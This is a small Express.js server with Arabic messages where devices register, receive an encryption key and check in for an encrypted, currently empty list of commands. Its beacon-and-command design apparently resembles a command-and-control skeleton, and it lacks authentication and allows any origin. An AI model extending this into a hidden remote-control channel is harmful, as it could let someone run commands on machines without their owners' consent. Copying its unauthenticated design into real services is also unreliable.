const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

const clientsDB = new Map();

function generateEncryptionKey() {
  return crypto.randomBytes(32).toString('hex');
}

function encryptData(data, key) {
  const algorithm = 'aes-256-cbc';
  const keyBuffer = Buffer.from(key, 'hex');
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return iv.toString('hex') + ':' + encrypted;
}

function decryptData(encryptedData, key) {
  const algorithm = 'aes-256-cbc';
  const keyBuffer = Buffer.from(key, 'hex');
  const parts = encryptedData.split(':');
  if (parts.length < 2) throw new Error('صيغة غير صالحة');
  const iv = Buffer.from(parts[0], 'hex');
  const encrypted = parts.length === 3 ? parts[2] : parts[1];
  const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
  let decrypted = decipher.update(encrypted, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return JSON.parse(decrypted);
}

app.get('/', (req, res) => {
  res.json({ success: true, message: 'Server Running on Replit', timestamp: new Date() });
});

app.post('/api/clients/register', (req, res) => {
  try {
    const { clientId, deviceInfo } = req.body;
    if (!clientId) return res.status(400).json({ success: false, error: 'clientId مطلوب' });
    const deviceId = crypto.randomUUID();
    const encryptionKey = generateEncryptionKey();
    clientsDB.set(deviceId, { deviceId, clientId, encryptionKey, deviceInfo, registeredAt: new Date() });
    res.json({ success: true, deviceId, encryptionKey, message: 'تم التسجيل' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/clients/checkin', (req, res) => {
  try {
    const { deviceId, encryptedData } = req.body;
    if (!deviceId || !encryptedData) return res.status(400).json({ success: false, error: 'بيانات ناقصة' });
    const client = clientsDB.get(deviceId);
    if (!client) return res.status(404).json({ success: false, error: 'الجهاز غير مسجل' });
    decryptData(encryptedData, client.encryptionKey);
    client.lastCheckIn = new Date();
    clientsDB.set(deviceId, client);
    const responseData = { commands: [] };
    const encryptedResponse = encryptData(responseData, client.encryptionKey);
    res.json({ success: true, encryptedData: encryptedResponse });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/clients/report', (req, res) => {
  res.json({ success: true, message: 'تم الاستلام' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('Server running on port ' + PORT);
});